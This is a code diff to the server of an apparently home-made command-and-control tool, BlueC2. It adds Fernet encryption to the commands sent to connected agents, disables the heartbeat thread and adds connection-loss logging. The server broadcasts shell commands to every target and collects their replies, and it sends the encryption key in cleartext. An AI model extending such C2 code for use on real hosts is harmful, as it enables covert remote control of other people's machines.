@@ -3,15 +3,17 @@
 import socket,threading,re,logging,platform,os,time
 from datetime import datetime
 from agent import Agent
+from cryptography.fernet import Fernet
 
 IP_REGEX = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
 
 class BlueServer:
 
-    __slots__ = ["ip","port","targets","connections","running","sock","agent_count","logger"]
+    __slots__ = ["ip","port","targets","connections","running","sock","agent_count","logger","key","fern","encryption"]
 
     def __init__(self,port):
         self.port = port
+        self.encryption = True
         self.connections = []
         self.targets = []
         self.ip = None
@@ -21,13 +23,16 @@ class BlueServer:
         self.sock.bind(('0.0.0.0',self.port))
         self.sock.listen(10) #sets backlog to 10
         self.agent_count = 0
+        if self.encryption == True:
+            self.key = Fernet.generate_key()
+            self.fern = Fernet(self.key)
         self.logger = logging.getLogger(__name__)
         logfilename = None
         if platform.system() == 'Linux':
             logfilename = "/var/log/bluec2.log"
             self.create_logfile(logfilename)
         elif platform.system() == 'Windows':
-            logfilename = 'C:/ProgramData/bluec2.log' #Fix this later to create a valid path
+            logfilename = "C:/Code/BlueC2/bluec2.log" #Fix this later to create a valid path
             self.create_logfile(logfilename)
         else:
             raise ValueError("Unrecognized OS:",platform.system())
@@ -71,9 +76,14 @@ class BlueServer:
             cmd = "cmd|"+cmd
             for target in self.targets:
                 try:
-                    target.sock.send(cmd.encode())
-                    reply = target.sock.recv(65535).decode()
-                    print(str(target),reply,sep="\n")
+                    if self.encryption == True:
+                        target.sock.send(self.encrypt(cmd.encode()))
+                        reply = self.decrypt(target.sock.recv(65535)).decode()
+                        print(str(target),reply,sep="\n")
+                    else:
+                        target.sock.send(cmd.encode())
+                        reply = target.sock.recv(65535).decode()
+                        print(str(target),reply,sep="\n")
                 except UnicodeDecodeError:
                     print(str(target)+"\nERROR: Unicode Decode Error")
                 except ConnectionResetError:
@@ -111,8 +121,8 @@ class BlueServer:
         self.running = True
         listener = threading.Thread(target=self.accept_connections, daemon=True)
         listener.start()
-        heartbeat = threading.Thread(target=self.heartbeat_all_conns,daemon=True)
-        heartbeat.start()
+        # heartbeat = threading.Thread(target=self.heartbeat_all_conns,daemon=True)
+        # heartbeat.start()
         logging.info("Startup process complete:"+self.get_timestamp())
         #Command handler
         while self.running == True:
@@ -157,6 +167,12 @@ class BlueServer:
             newAgent = Agent(self.agent_count,sock,ip)
             self.connections.append(newAgent)
             logging.info("Accepted connection from "+newAgent.ip[0]+":"+self.get_timestamp())
+            #sends inital messages to inform client if encryption is being used
+            if self.encryption == True:
+                newAgent.sock.send("encryption on".encode())
+                newAgent.sock.send(self.key) #CONTINUE HERE!!!!
+            else:
+                newAgent.sock.send("encryption off".encode())
 
     def ip_to_agent(self,ip):
         for agent in self.connections:
@@ -173,11 +189,18 @@ class BlueServer:
     def send_heartbeat(self,agent):
         try:
             agent.sock.settimeout(5.0)
-            agent.sock.send("heartbeat".encode()) 
-            reply = agent.sock.recv(10).decode()
+            reply = ""
+            if self.encryption == True:
+                agent.sock.send(self.encrypt("heartbeat".encode())) 
+                reply = self.decrypt(agent.sock.recv(10)).decode()
+            else:
+                agent.sock.send("heartbeat".encode()) 
+                reply = agent.sock.recv(10).decode()
             if reply != "ACTIVE":
+                logging.warning("Lost connection to " + agent.ip[0]+":"+self.get_timestamp())
                 self.connections.remove(agent)
         except socket.timeout:
+            logging.warning("Lost connection to " + agent.ip[0]+"(timeout):"+self.get_timestamp())
             print("Agent " + agent.number + " timed out, removing from connections")
             self.connections.remove(agent)
         finally:
@@ -188,6 +211,12 @@ class BlueServer:
             for conn in self.connections:
                 self.send_heartbeat(conn)
                 time.sleep(60) #pauses for one minute
+    
+    def encrypt(self,data):
+        return self.fern.encrypt(data)
+
+    def decrypt(self,data):
+        return self.fern.decrypt(data)
 
 def display_banner():
     try:
